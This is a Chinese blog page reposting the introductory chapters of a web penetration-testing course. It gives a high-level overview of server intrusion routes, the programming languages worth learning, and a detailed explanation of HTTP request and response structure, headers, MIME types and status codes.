<!DOCTYPE html>
<html lang="en">
<head>

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="KarmA" />



<meta name="description" content="无意中发现的 treasure :) ，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？">
<meta name="keywords" content="Summary,渗透课程,Mark">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透课程">
<meta property="og:url" content="http://blog.0akarma.me/Study/penetrating-courses.html">
<meta property="og:site_name" content="KarmA @ D0g3">
<meta property="og:description" content="无意中发现的 treasure :) ，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-10-09T15:33:52.955Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="渗透课程">
<meta name="twitter:description" content="无意中发现的 treasure :) ，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="KarmA @ D0g3" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.ico">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">





    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>渗透课程 | KarmA @ D0g3</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: false,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>



    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>



    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?af7140fc2364ae33aedfd77c0de502e1";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>


</head>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/2.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">KarmA</a></h1>
        </hgroup>

        
        <p class="header-subtitle">Stay hungry.Stay foolish.</p>
        

        
            <form id="search-form">
            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
            <i class="fa fa-times" onclick="resetSearch()"></i>
            </form>
            <div id="local-search-result"></div>
            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>Menu</li>
                        <li>Tags</li>
                        
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">Home</a></li>
                        
                            <li><a href="/archives/">Archives</a></li>
                        
                            <li><a href="/tags/">Tags</a></li>
                        
                            <li><a href="/board/">Comment</a></li>
                        
                            <li><a href="/about/">About &amp; Links</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa GitHub" href="https://github.com/akkayin" title="GitHub"></a>
                            
                                <a class="fa Email" href="mailto:karma@d0g3.cn" title="Email"></a>
                            
                                <a class="fa 新浪微博" href="http://weibo.com/akkayin" title="新浪微博"></a>
                            
                                <a class="fa 知乎" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
                            
                                <a class="fa Twitter" href="https://twitter.com/harold_kung" title="Twitter"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Achievements/">Achievements</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Arbitrary-File-Upload/">Arbitrary File Upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Book/">Book</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CET/">CET</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMS-Recurrence/">CMS Recurrence</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Code-Audit/">Code Audit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Expectation/">Expectation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Film/">Film</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flag/">Flag</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MISC/">MISC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mac/">Mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mark/">Mark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meditation/">Meditation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Movie/">Movie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Notes/">Notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Penetration-Testing/">Penetration Testing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Perception/">Perception</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL-Injection/">SQL Injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Scrapy/">Scrapy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shell/">Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Summary/">Summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vulnhub/">Vulnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Words-Phrases/">Words&Phrases</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mentohust/">mentohust</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路历程/">心路历程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透课程/">渗透课程</a></li></ul>
                    </div>
                </section>
                
                
                

                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">KarmA</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/2.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">KarmA</a></h1>
            </hgroup>
            
            <p class="header-subtitle">Stay hungry.Stay foolish.</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">Home</a></li>
                
                    <li><a href="/archives/">Archives</a></li>
                
                    <li><a href="/tags/">Tags</a></li>
                
                    <li><a href="/board/">Comment</a></li>
                
                    <li><a href="/about/">About &amp; Links</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/akkayin" title="GitHub"></a>
                            
                                <a class="fa Email" target="_blank" href="mailto:karma@d0g3.cn" title="Email"></a>
                            
                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/akkayin" title="新浪微博"></a>
                            
                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/harold-95-37/activities" title="知乎"></a>
                            
                                <a class="fa Twitter" target="_blank" href="https://twitter.com/harold_kung" title="Twitter"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
</nav>
      <div class="body-wrap"><article id="post-渗透课程" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/Study/penetrating-courses.html" class="article-date">
      <time datetime="2017-12-26T08:42:05.000Z" itemprop="datePublished">2017-12-26</time>
</a>


    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      渗透课程
    </h1>
  

        
      </header>
      
      <div class="article-info article-info-post">
        
        
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/Study/">Study</a>
    </div>


        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Mark/">Mark</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透课程/">渗透课程</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <excerpt in="" index="" |="" 首页摘要="">

<p>无意中发现的 treasure <strong>:) </strong>，虽然里面很多东西我都不会，但是广泛涉猎，mark下来，没事看一看，复现一下，何尝又不是一件好事情？<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<p><strong>本文所有文章均转载自：<a href="http://www.yuntest.org/" target="_blank" rel="noopener">http://www.yuntest.org/</a> 如有侵权，请联系。</strong></p>
<hr>
<p><br></p>
<h1 id="前言-揭开Web渗透与安全的面纱（必看）"><a href="#前言-揭开Web渗透与安全的面纱（必看）" class="headerlink" title="前言-揭开Web渗透与安全的面纱（必看）"></a>前言-揭开Web渗透与安全的面纱（必看）</h1><h2 id="服务器是怎么被入侵的"><a href="#服务器是怎么被入侵的" class="headerlink" title="服务器是怎么被入侵的"></a>服务器是怎么被入侵的</h2><p>攻击者想要对一台计算机<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>必须具备以下条件：</p>
<p>1、服务器与客户端能够正常通讯</p>
<p>（服务器是为客户端提供服务的）</p>
<p>2、服务器向客户端提供的权限（服务）或者说是端口。</p>
<h2 id="服务端所提供的服务"><a href="#服务端所提供的服务" class="headerlink" title="服务端所提供的服务"></a>服务端所提供的服务</h2><p>早期的黑客入侵的方法大部分都是对服务器进行端口扫描，对数据库的爆破，以及对FTP的爆破（穷举）缓冲区溢出攻击的方式。尽管如此没有含量的<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>，在当时的100台计算机中，大约有20台计算机能中招。可见当初的web服务器很脆弱。</p>
<p>我为什么说这些呢，好，接着看。如今的web不仅仅是web，它还有个名字叫做 web应用程序 。为什么叫做web应用程序，因为web已经不是以前的web，它可以社交、购物、办公、游戏、公司管理、学校管理等等等等！从某种方面上来讲，它比客户端程序更方便，更出色，更完善。</p>
<hr>
<h2 id="了解web的基础知识"><a href="#了解web的基础知识" class="headerlink" title="了解web的基础知识"></a>了解web的基础知识</h2><p>我们可以把html,asp,php等网页看做是一种程序（脚本语言），而他需要放在服务器的web容器（比如iis,Apache等）里才能编译成可视化内容。所以我们用户访问的网站都是经过容器编译过的。Web容器是基于系统的，它可以对计算机系统发出命令。Web容器又是处理网站脚本文件的，也就是说：我们是通过对脚本程序发出命令，再由Web容器处理，间接操纵服务器</p>
<h2 id="怎么攻陷服务器"><a href="#怎么攻陷服务器" class="headerlink" title="怎么攻陷服务器"></a>怎么攻陷服务器</h2><p>这张图是我在某群里下载的，个人感觉概括性很强，就用到这里来了。大家看的懂得就看得懂，看不懂的也没关系。但是以下内容必须看得懂：</p>
<p>想入侵一台服务器，大致分为3个入口：</p>
<p>1,C段攻击</p>
<p>2,services</p>
<p>3,社会工程学</p>
<p>C段攻击指的是攻击者通过渗透同一个网段内的一台主机对目标主机进行ARP等手段渗透</p>
<p>社会工程学：高端攻击必须掌握的一个技能,是属于脚本以外的社交欺骗技术,涉及到物理渗透, 总之就是—骗 。（后面详说）</p>
<p>至于services：又有很多入口（溢出、MySQL、FTP、mssql、rdp、web等等）,这里的Web指的是网站脚本程序,也存在入口（注入,上传漏洞,xss,包含漏洞,代码执行,逻辑漏洞等等等等）</p>
<p>差不多我要讲课的大半部分内容都围绕着以上的知识点。特别是services</p>
<h1 id="第一篇-Web渗透需要接触的语言"><a href="#第一篇-Web渗透需要接触的语言" class="headerlink" title="第一篇-Web渗透需要接触的语言"></a>第一篇-Web渗透需要接触的语言</h1><p>—恢复内容开始—</p>
<p>上一篇我们讲过了,Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>的基本原理,在原理中我们也提到了Web应用程序（脚本语言）,本章就谈到了Web<a href="http://www.yuntest.org/archives/tag/shen-tou/" target="_blank" rel="noopener">渗透</a>要涉及的语言。</p>
<h2 id="涉及语言："><a href="#涉及语言：" class="headerlink" title="涉及语言："></a>涉及语言：</h2><p>1、html:是前段语言的其中一个,也是最常见的,涉及审查元素的修改以及自行构造界面（如构造上传点）</p>
<p>2、JavaScript:也是属于前段语言之一（掌握这个语言可以更了解<a href="http://www.yuntest.org/archives/tag/xss/" target="_blank" rel="noopener">xss</a>跨站脚本攻击）</p>
<p>3、数据库:这里的数据库不止是一种语言,而是包含了多种数据库（如我们常见MySQL,ms<a href="http://www.yuntest.org/archives/tag/sql/" target="_blank" rel="noopener">sql</a>,db2）,而我们要掌握的就是操控数据库的SQL语句,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>的时候多用到。</p>
<p>4、JAVA:跨平台语言,无论在哪个系统,只需要一个环境,web领域中有很多涉及。有很多大型企业都是用JAVA开发Web。还有我们的渗透神器burp 等等都是由JAVA开发。</p>
<p>5、PHP,跨平台语言,即写即用,无需编译。当代主流Web程序。</p>
<p>6、C/C++:公认的永远不会衰败的语言,怎么说呢,这个必须学,学了只有好处没有坏处。Windows操作系统一大部分都是由C完成的。</p>
<h2 id="小编说"><a href="#小编说" class="headerlink" title="小编说"></a>小编说</h2><p>看到这里许多朋友可能会问,学个渗透还得需要学那么多基础。肯定有一些人要放弃了。其实小编也是九牛一毛,就学了一些平常会用到的,很多时候还得看前辈的文章。不过多多少少还是有点经验的,下面就分享小编偷工减料的技巧,其实我们可以学三个最经常用到的,也是最简单的（html,JavaScript,SQL）还有就是抽空出来学习c语言</p>
<h2 id="学习心得"><a href="#学习心得" class="headerlink" title="学习心得"></a>学习心得</h2><p>1、html:html的语法实在是很简单,只需要学清楚头标记、尾标记（闭合）,空标记。以及一些调用,参数设置,简单标签。百度搜索html教程就有一大堆免费教程</p>
<p>2、js可以从这里学<a href="http://www.w3school.com.cn/js/index.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/js/index.asp</a>   w3school系列的挺不错</p>
<p>3、SQL:其实小编认为这个稍微了解一下就好了,毕竟现在的工具越来越成熟,在<a href="http://www.yuntest.org/archives/tag/zhu-ru/" target="_blank" rel="noopener">注入</a>方面都是以工具为主</p>
<p>4、C语言：如果你看过了html,那你学这个会有一定的思路引导。小编之前是在:慕课网学的(百度搜索）,简单通俗易懂。</p>
<p>5、还有一些常用的DOS命令也是必须要学的,例如net user啊什么的</p>
<p>6、JAVA可以不用太深入学习,但是！必须了解它的框架构造以及环境的搭建（后面用的地方多着呢）</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果不是学代码审计工作,而是本着Web的目标去学习,那么用小编所说的偷懒学习法去学习还是挺合适的。但是能学还是要尽量学的,一个百度就解决了。许多小白和大神的差距就在代码上。可能会有人说：我不会英语该怎么学。</p>
<p>其实这东西跟英语关系不是很大,只要你用心一个一个学,一门通门门通。只要认真和耐心。</p>
<p>如果朋友你对脚本语言之前不是很了解,那么也没关系,接着往下看,只是要多做笔记,看一篇就如百度了解一篇涉及的内容。如果看到一半卡住了,可以随时回来学脚本。</p>
<p>—恢复内容结束—</p>
<h1 id="第二篇上-http请求协议的简单描述"><a href="#第二篇上-http请求协议的简单描述" class="headerlink" title="第二篇上-http请求协议的简单描述"></a>第二篇上-http请求协议的简单描述</h1><h2 id="HTTP协议剖析"><a href="#HTTP协议剖析" class="headerlink" title="HTTP协议剖析"></a>HTTP协议剖析</h2><p>什么是HTTP协议？如何发起请求？我认为这样讲大家能够理解：</p>
<p>浏览器访问网站也是http请求的一个过程。当你打开浏览器,访问一个URL</p>
<p>（协议://服务器IP:端口/路径/文件）的时候,相当于向服务器发送了一个http请求,然后服务器会根据你的请求,向你响应一个HTML数据。这个客户端与服务端交互的过程叫做http协议。那么这个协议的过程是什么样子的呢？（简版）</p>
<p>1：客户端向服务端发送请求</p>
<p>2：服务端向客户端响应html数据</p>
<p>3：连接自动切断</p>
<p>PS:这个请求只能由客户端发起,而服务端不能主动向客户端发起！</p>
<p>然而我们通过浏览器发送的http请求,在服务器响应后,客户端接受到的数据都是被浏览器渲染过而显示的画面。为了能更清晰的剖析客户端与服务端之间的协议交互,我们来一次脱离浏览器的http请求。这就要借用到我们的工具:</p>
<p>curl.exe</p>
<p>一般来说Linux自带curl.exe 似乎Windows没有自带curl.exe 没关系,Windows的用户也可以通过下载使用。</p>
<h2 id="脱离浏览器发起http请求"><a href="#脱离浏览器发起http请求" class="headerlink" title="脱离浏览器发起http请求"></a>脱离浏览器发起http请求</h2><p>我们可以通过输入命令:</p>
<p>cURL <a href="http://www.baidu.com/" target="_blank" rel="noopener">http://www.baidu.com/</a></p>
<p>来向百度发起http请求,看看返回的响应结果吧！</p>
<p>看,返回的是一个html文件数据！我们还可以在原命令的基础上后面加个参数 -I 来查看http服务器返回的响应头。</p>
<p>好了我们基本了解了http请求的基本逻辑,就通过下面这篇文章来对http进行深度剖析吧！</p>
<h1 id="第二篇下-HTTP协议的请求与响应深度剖析"><a href="#第二篇下-HTTP协议的请求与响应深度剖析" class="headerlink" title="第二篇下-HTTP协议的请求与响应深度剖析"></a>第二篇下-HTTP协议的请求与响应深度剖析</h1><h2 id="什么是请求方法？什么是请求头？"><a href="#什么是请求方法？什么是请求头？" class="headerlink" title="什么是请求方法？什么是请求头？"></a>什么是请求方法？什么是请求头？</h2><h3 id="HTTP请求信息由3部分组成："><a href="#HTTP请求信息由3部分组成：" class="headerlink" title="HTTP请求信息由3部分组成："></a>HTTP请求信息由3部分组成：</h3><p>1、请求方法（GET/POST） URI 协议/版本</p>
<p>2、请求头(Request Header)</p>
<p>3、请求正文</p>
<h3 id="下面我们来分析一个http请求："><a href="#下面我们来分析一个http请求：" class="headerlink" title="下面我们来分析一个http请求："></a>下面我们来分析一个http请求：</h3><p>POST <a href="http://xg.mediportal.com.cn/health/sms/verify/telephone" target="_blank" rel="noopener">http://xg.mediportal.com.cn/health/sms/verify/telephone</a> HTTP/1.1</p>
<p>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10)</p>
<p>Content-Type: application/x-www-form-urlencoded; charset=UTF-8</p>
<p>Host: xg.mediportal.com.cn</p>
<p>Connection: Keep-Alive</p>
<p>Accept-Encoding: gzip</p>
<p>Content-Length: 33</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h4 id="我们来对这段请求进行分析："><a href="#我们来对这段请求进行分析：" class="headerlink" title="我们来对这段请求进行分析："></a>我们来对这段请求进行分析：</h4><p>请求的第一行是—-方法（POST） URL 协议（HTTP）/版本（1.1）</p>
<p>这里的POST就是方法 HTTP请求可以使用多种请求方法。</p>
<h3 id="（1）HTTP1-1目前支持以下7种请求方法："><a href="#（1）HTTP1-1目前支持以下7种请求方法：" class="headerlink" title="（1）HTTP1.1目前支持以下7种请求方法："></a>（1）HTTP1.1目前支持以下7种请求方法：</h3><ul>
<li>GET ：请求获取由Request-URI所标识的资源</li>
<li>POST：在Request-URI所标识的资源后附加新的数据</li>
<li>HEAD：请求获取由Request-URI所标识的资源的响应消息报头</li>
<li>OPTIONS：请求查询服务器的性能，或查询与资源相关的选项和需求</li>
<li>PUT：请求服务器存储一个资源，并用Request-URI作为其标识</li>
<li>DELETE：请求服务器删除由Request-URI所标识的资源</li>
<li>TRACE：请求服务器回送收到的请求信息，主要用语测试或诊断，在Internet应用中，最常用的方法是GET和POST。最后，协议版本声明了通信过程中使用HTTP的版本。</li>
</ul>
<h3 id="（2）请求头-Request-Header"><a href="#（2）请求头-Request-Header" class="headerlink" title="（2）请求头(Request Header)"></a>（2）请求头(Request Header)</h3><p>请求头包含许多有关的客户端环境和请求正文的有用信息。例如：请求头可以声明浏览器所用的语言，请求正文的长度等。</p>
<ul>
<li>User-Agent: DGroupPatient/1.052701.230/Dalvik/2.1.0 (Linux; U; Android 5.1.1; KIW-AL10 Build/HONORKIW-AL10) //用户发送请求的客户端环境</li>
<li>Content-Type: application/x-www-form-urlencoded; charset=UTF-8 //表单默认的提交数据的格式</li>
<li>Host: xg.mediportal.com.cn //请求资源的Intenet主机和端口号</li>
<li>Connection: Keep-Alive //持久连接</li>
<li>Accept-Encoding: gzip //浏览器能够进行解码的数据编码方式</li>
<li>Content-Length: 33 //请求正文的长度</li>
<li>Content-Type</li>
</ul>
<p><strong>是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。</strong></p>
<p>Content-Type: [type]/[subtype]; parameter。例如最常见的就是text/html，它的意思是说返回的内容是文本类型，这个文本又是HTML格式的。原则上浏览器会根据Content-Type来决定如何显示返回的消息体内容：</p>
<ul>
<li>Host指定请求资源的Intenet主机和端口号，必须表示请求url的原始服务器或网关的位置。HTTP/1.1请求必须包含主机头域，否则系统会以400状态码返回</li>
<li>Accept：浏览器可接受的MIME类型</li>
<li>Accept-Charset：浏览器可接受的字符集</li>
<li>Accept-Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间</li>
<li>Accept-Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到</li>
<li>Authorization：授权信息，通常出现在对服务器发送的WWW-Authenticate头的应答中</li>
<li>Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep- Alive”，或者看到请求使用的是HTTP1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content-Length头，最简单的实现方法是：先把内容写入 ByteArrayOutputStream，然后在正式写出内容之前计算它的大小</li>
<li>Content-Length：表示请求消息正文的长度</li>
<li>Cookie：这是最重要的请求头信息之一</li>
<li>From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它</li>
<li>Host：初始URL中的主机和端口</li>
<li>If-Modified-Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答</li>
<li>Pragma：指定“no-cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝</li>
<li>Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面</li>
<li>User-Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用</li>
<li>UA-Pixels，UA-Color，UA-OS，UA-CPU ： 由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型</li>
</ul>
<h4 id="常见的MIME类型如下："><a href="#常见的MIME类型如下：" class="headerlink" title="常见的MIME类型如下："></a>常见的MIME类型如下：</h4><p>text/html ： HTML格式</p>
<p>text/plain ：纯文本格式</p>
<p>text/xml ： XML格式</p>
<p>image/gif ：gif图片格式</p>
<p>image/jpeg ：jpg图片格式</p>
<p>image/png：png图片格式</p>
<p>以application开头的媒体格式类型：</p>
<p>application/xhtml+xml ：XHTML格式</p>
<p>application/xml ： XML数据格式</p>
<p>application/atom+xml ：Atom XML聚合格式</p>
<p>application/json ： JSON数据格式</p>
<p>application/pdf ：pdf格式</p>
<p>application/msword ： Word文档格式</p>
<p>application/octet-stream ： 二进制流数据（如常见的文件下载）</p>
<p>application/x-www-form-urlencoded ： <form enctype="””">中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式）</form></p>
<p>另外一种常见的媒体格式是上传文件之时使用的：</p>
<p>multipart/form-data ： 需要在表单中进行文件上传时，就需要使用该格式</p>
<h3 id="（3）请求正文"><a href="#（3）请求正文" class="headerlink" title="（3）请求正文"></a>（3）请求正文</h3><p>请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息：</p>
<p>telephone=15527177736&amp;userType=1&amp;</p>
<h3 id="HTTP响应格式"><a href="#HTTP响应格式" class="headerlink" title="HTTP响应格式"></a>HTTP响应格式</h3><p><strong>HTTP应答与HTTP请求相似，HTTP响应也由3个部分构成，分别是：</strong></p>
<p>1、状态行</p>
<p>2、响应头(Response Header)</p>
<p>3、响应正文</p>
<p><strong>以下就是一个响应格式，我们来分析：</strong></p>
<p>HTTP/1.1 200 OK //状态行</p>
<p>Server: nginx</p>
<p>Date: Tue, 31 May 2016 02:09:24 GMT</p>
<p>Content-Type: application/json;charset=UTF-8</p>
<p>Connection: keep-alive</p>
<p>Vary: Accept-Encoding</p>
<p>Access-Control-Allow-Origin: *</p>
<p>Access-Control-Allow-Headers: X-Requested-With,access_token,access-token,content-type,multipart/form-data,application/x-www-form-urlencoded</p>
<p>Access-Control-Allow-Methods: GET,POST,OPTIONS</p>
<p>Content-Length: 49</p>
<p>{“resultCode”:1,”resultMsg”:”手机号未注册”} //正文</p>
<h4 id="（1）状态行"><a href="#（1）状态行" class="headerlink" title="（1）状态行"></a>（1）状态行</h4><p>由协议版本、数字形式的状态代码、及相应的状态描述，各元素之间以空格分隔。</p>
<p>状态代码：状态代码由3位数字组成，表示请求是否被理解或被满足。</p>
<p>状态描述：状态描述给出了关于状态代码的简短的文字描述。</p>
<p>状态代码的第一个数字定义了响应的类别，后面两位没有具体的分类。</p>
<p><strong>第一个数字有五种可能的取值：</strong></p>
<p>- 1xx: 指示信息—表示请求已接收，继续处理。</p>
<p>- 2xx: 成功—表示请求已经被成功接收、理解、接受。</p>
<p>- 3xx: 重定向—要完成请求必须进行更进一步的操作。</p>
<p>- 4xx: 客户端错误—请求有语法错误或请求无法实现。</p>
<p>- 5xx: 服务器端错误—服务器未能实现合法的请求。</p>
<p>常见的状态码：</p>
<ul>
<li>200 OK 客户端请求成功</li>
<li>400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。</li>
<li>401 Unauthonzed 请求未经授权。这个状态代码必须和WWW-Authenticate报头域一起使用</li>
<li>403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因</li>
<li>404 Not Found 请求的资源不存在，例如，输入了错误的URL。</li>
<li>500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。</li>
<li>503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常</li>
</ul>
<h4 id="（2）响应头"><a href="#（2）响应头" class="headerlink" title="（2）响应头"></a>（2）响应头</h4><p>响应头可能包括：</p>
<ul>
<li>Location：Location响应报头域用于重定向接受者到一个新的位置。例如：客户端所请求的页面已不存在原先的位置，为了让客户端重定向到这个页面新的位置，服务 器端可以发回Location响应报头后使用重定向语句，让客户端去访问新的域名所对应的服务器上的资源。当我们在JSP中使用重定向语句的时候，服务器 端向客户端发回的响应报头中，就会有Location响应报头域。</li>
<li>Server：Server响应报头域包含了服务器用来处理请求的软件信息。它和User-Agent请求报头域是相对应的，前者发送服务器端软件的信息，后者发送客户 端软件(浏览器)和操作系统的信息。下面是Server响应报头域的一个例子：Server: Apache-Coyote/1.1</li>
